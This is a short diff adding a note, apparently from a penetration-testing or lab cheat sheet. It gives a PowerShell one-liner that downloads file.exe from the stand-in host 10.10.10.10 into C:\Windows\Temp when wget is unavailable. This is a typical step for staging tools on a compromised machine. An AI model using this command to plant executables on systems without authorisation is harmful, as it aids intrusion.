@@ -1,0 +1,3 @@
+When wget is not available/usable on a Windows machine use this command to pull files from an http server:
+
+powershell -c "Invoke-WebRequest -Uri '10.10.10.10/file.exe' -OutFile 'C:\Windows\Temp\file.exe'"
